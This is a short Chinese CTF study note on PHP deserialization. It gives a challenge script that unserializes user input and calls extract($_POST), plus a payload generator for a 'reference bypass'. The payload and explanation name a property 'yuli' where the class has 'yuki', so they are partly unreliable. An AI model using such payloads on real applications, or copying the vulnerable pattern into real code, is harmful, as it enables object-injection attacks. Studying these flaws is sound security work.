### php反序列化文章

[php序列化 - l3m0n - 博客园](https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html?utm_source=tuicool&utm_medium=referral#11-什么是序列化)





### 引用绕过

例题

```php
<?php
   error_reporting(0);
   require_once("flag.php");
   class popmart{
        public $yuki;
	    public $molly;
        public $dimoo;

	    public function __construct(){
        	$this->yuki='tell me where';
            $this->molly='dont_tell_you';
  	        $this->dimoo="you_can_guess";
	    }

	    public function __wakeup(){
	        global $flag;
	        global $where_you_go;
	        $this->yuki=$where_you_go;

	        if($this->molly === $this->yuki){
	            echo $flag;
	        }
	    }
   }
   $pucky = $_GET['wq'];
   if(isset($pucky)){
	    if($pucky==="二仙桥"){
	        extract($_POST);
	        if($pucky==="二仙桥"){
	            die("<script>window.alert('说说看，你要去哪？？');</script>");
	        }
	    }
   }
   unserialize($pucky);
```

观察wakeup函数

拿到flag的条件是molly===yuki

但是这里会给yuli进行赋值，由于我们不知道这里给yuli赋的什么值，所以我们可以考虑使用引用绕过


```
 public function __wakeup(){
	        global $flag;
	        global $where_you_go;
	        $this->yuki=$where_you_go;

	        if($this->molly === $this->yuki){
	            echo $flag;
	        }
	    }
   }
```

payload：

```php
<?php
   class popmart{
        public $yuki;
	    public $molly;
        public $dimoo;
   }
   $test=new popmart();
   $test->molly = &$test->yuli;
   echo urlencode(serialize($test));
```

引用绕过其实就是让molly的地址等于yuli的地址，这样molly的值就永远等于yuli，通过判断



